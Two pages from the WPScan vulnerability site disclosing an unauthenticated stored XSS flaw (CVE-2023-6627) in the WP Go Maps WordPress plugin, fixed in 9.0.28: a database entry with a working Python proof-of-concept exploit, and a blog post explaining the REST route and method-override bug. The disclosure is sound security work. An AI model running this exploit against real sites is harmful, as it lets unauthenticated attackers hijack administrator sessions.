=== Content from wpscan.com_9225b9ec_20250115_090939.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# WP Go Maps < 9.0.28 - Unauthenticated Stored XSS

### Description

The plugin does not properly protect most of its REST API routes, which attackers can abuse to store malicious HTML/Javascript on the site.

### Proof of Concept

Run the following Python script, then visit https://vulnerable-site.tld/wp-admin/admin.php?page=wp-google-maps-menu&action=edit&map\_id=1.
Alternatively, visit the page where the map is displayed after the fact and click on the affected marker to trigger the XSS.
```
import sys
import requests
if len(sys.argv) != 2:
print(f'{sys.argv[0]} <target\_site\_root\_url>')
sys.exit()
url = sys.argv[1].rstrip('/')
# Get list of existing markers
res = requests.get(f'{url}/wp-json/wpgmza/v1/markers').json()
if len(res) == 0:
print('# No markers found! Make sure the plugin is properly setup.')
sys.exit()
marker\_id = res[0]['id']
print(f'# Found marker ID #{marker\_id}, using it to demonstrate the exploit')
print('# Tricking the POST section of the endpoint to store our XSS payload..')
body = {
'address': '<img src="x&quot; onerror=alert(&quot;xss&quot;)//">'
}
requests.post(f'{url}/wp-json/wpgmzA/v1/markers?\_method=get&random=/wpgmza/v1/markers/{marker\_id}', data=body)
```

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

wp-google-maps](https://a8cteam5105.wordpress.com/plugin/wp-google-maps/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 9.0.28

### References

CVE
[CVE-2023-6627](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6627)

URL
<https://wpscan.com/blog/stored-xss-fixed-in-wp-go-maps-9-0-28/>

### Classification

Type
XSS

OWASP top 10
[A7: Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_%28XSS%29)

CWE
[CWE-79](https://cwe.mitre.org/data/definitions/79.html)

CVSS
[8.8 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Marc Montpas

Submitter
Marc Montpas

Submitter website
<https://wpscan.com>

Submitter twitter
[marcS0H](//twitter.com/marcS0H)

Verified
Yes

WPVDB ID
[f5687d0e-98ca-4449-98d6-7170c97c8f54](https://a8cteam5105.wordpress.com/vulnerability/f5687d0e-98ca-4449-98d6-7170c97c8f54/)

### Timeline

Publicly Published
2023-12-12 (about 1 years ago)

Added
2023-12-12 (about 1 years ago)

Last Updated
2023-12-12 (about 1 years ago)

### Other

Published
Title

Published
2019-09-16
Title
[Poll, Survey, Form & Quiz Maker by OpinionStage < 19.6.25 - Unauthenticated Cross-Site Scripting (XSS)](https://a8cteam5105.wordpress.com/vulnerability/4ed1edd6-3813-44a3-bee7-f07c1774b679/)

Published
2014-08-01
Title
[q2w3-inc-manager <= 2.3.1 - XSS in ZeroClipboard](https://a8cteam5105.wordpress.com/vulnerability/11968898-26e9-4bca-8b12-27f47355a57d/)

Published
2024-03-25
Title
[Molongui < 4.7.8 - Authenticated (Author+) Stored Cross-Site Scripting](https://a8cteam5105.wordpress.com/vulnerability/051b036d-1a10-42d7-a69c-15870804fa92/)

Published
2024-12-03
Title
[WPBITS Addons For Elementor Page Builder < 1.6 - Authenticated (Author+) Stored Cross-Site Scripting via SVG File Upload](https://a8cteam5105.wordpress.com/vulnerability/1af9bee4-ef22-4d64-afae-a33f7f835f05/)

Published
2016-03-28
Title
[CloudFlare <= 1.3.20 - Authenticated Cross-Site Scripting (XSS)](https://a8cteam5105.wordpress.com/vulnerability/1e03fb0d-23a1-4451-bf8a-9b5dc9790b50/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from wpscan.com_df6b81d7_20250115_090938.html ===


* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

Updated on December 12, 2023December 12, 2023
# Stored XSS Fixed In WP Go Maps 9.0.28

During an analysis of [the WP Go Maps plugin (formerly WP Google Maps)](https://wordpress.org/plugins/wp-google-maps/), we discovered a pretty serious Stored XSS vulnerability that can be exploited by any attackers, regardless of whether they have an account on the site.

When successfully exploited, this vulnerability may let attackers perform any action the logged‑in administrator they targeted is allowed to do on the targeted site, including installing arbitrary plugins, and creating new rogue Administrator users.

Upon identifying the vulnerability, we promptly alerted the authors of that plugin, who released version 9.0.28 to fix the issue. It is crucial for administrators of sites using this plugin to ensure it is fully updated to safeguard against this vulnerability.

## Unauthenticated Stored XSS

| **Fixed Version** | 9.0.28 |
| --- | --- |
| **CVE-ID** | [CVE-2023-6627](https://www.cve.org/CVERecord?id=CVE-2023-6627) |
| **WPVDB-ID** | [f5687d0e-98ca-4449-98d6-7170c97c8f54](https://wpscan.com/vulnerability/f5687d0e-98ca-4449-98d6-7170c97c8f54/) |
| **CVSSv3.1** | [8.8](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H&version=3.1) |

The plugin registered multiple REST API routes, a few which shared the same callback methods where it would then guess which code needs to be ran by checking the route that led to the method using regular expressions on `$_SERVER['REQUEST_URI']`, and comparing the HTTP method used via `$_SERVER['REQUEST_METHOD']`.

```

switch( $_SERVER[‘REQUEST_METHOD’] )
{
            case 'GET':
                if(preg_match('#/wpgmza/v1/markers/(\d+)#', $route, $m)) {
                    $marker = Marker::createInstance($m[1], Crud::SINGLE_READ, isset($_GET['raw_data']));
                    return $marker;
                }
// (... lots of code ...)
            case 'POST':
                         if(preg_match('#/wpgmza/v1/markers/(\d+)#', $route, $m))
                    $id = $m[1];
                else
                    $id = -1;

```

Unfortunately, since the WordPress REST API gives some flexibility to users by allowing them to specify both [the route](https://developer.wordpress.org/rest-api/extending-the-rest-api/routes-and-endpoints/#routes-vs-endpoints) and [HTTP method to use](https://developer.wordpress.org/rest-api/using-the-rest-api/global-parameters/#_method-or-x-http-method-override-header) for a given request via other means, this made it possible for attackers to bypass the capability checks that would otherwise occur based on the HTTP method used.

This, combined with other logic bugs around decoding HTML entities in already sanitized HTML user content, made it possible for unauthenticated attackers to conduct Stored XSS attacks.

A proof of concept will be made available on [the WPScan entry for this issue](https://wpscan.com/vulnerability/f5687d0e-98ca-4449-98d6-7170c97c8f54/) on January 1st, 2024.

**Timeline**

* 2023‑12‑08 – Details of the vulnerability sent to the WP Go Maps team
* 2023‑12‑09 – WP Go Maps confirms reception of our report, and starts working on a fix
* 2023‑12‑12 – A patch is released by the WP Go Maps team for this issue

**Credits**

Original research: Marc Montpas

Thanks to the rest of the WPScan team for feedback, help, and corrections.

### Share this:

* [Twitter](https://wpscan.com/blog/stored-xss-fixed-in-wp-go-maps-9-0-28/?share=twitter "Click to share on Twitter")
* [Facebook](https://wpscan.com/blog/stored-xss-fixed-in-wp-go-maps-9-0-28/?share=facebook "Click to share on Facebook")
Like Loading…
## Posted by

![](https://0.gravatar.com/avatar/6fc96ab17c597fba35b3e50fdac0963304b08d097a3cb8c7a12b5aab370ca908?s=48&d=identicon&r=G)

[Marc Montpas](https://wpscan.com/blog/author/marcs0h/)

## Get News and Tips From WPScan

Type your email…

Subscribe

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Reblog
* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Fstored-xss-fixed-in-wp-go-maps-9-0-28%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Fstored-xss-fixed-in-wp-go-maps-9-0-28%252F)
  + [Copy shortlink](https://wp.me/pf0jyo-SX)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com/blog/stored-xss-fixed-in-wp-go-maps-9-0-28/)
  + [View post in Reader](https://wordpress.com/read/blogs/221720208/posts/3407)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)

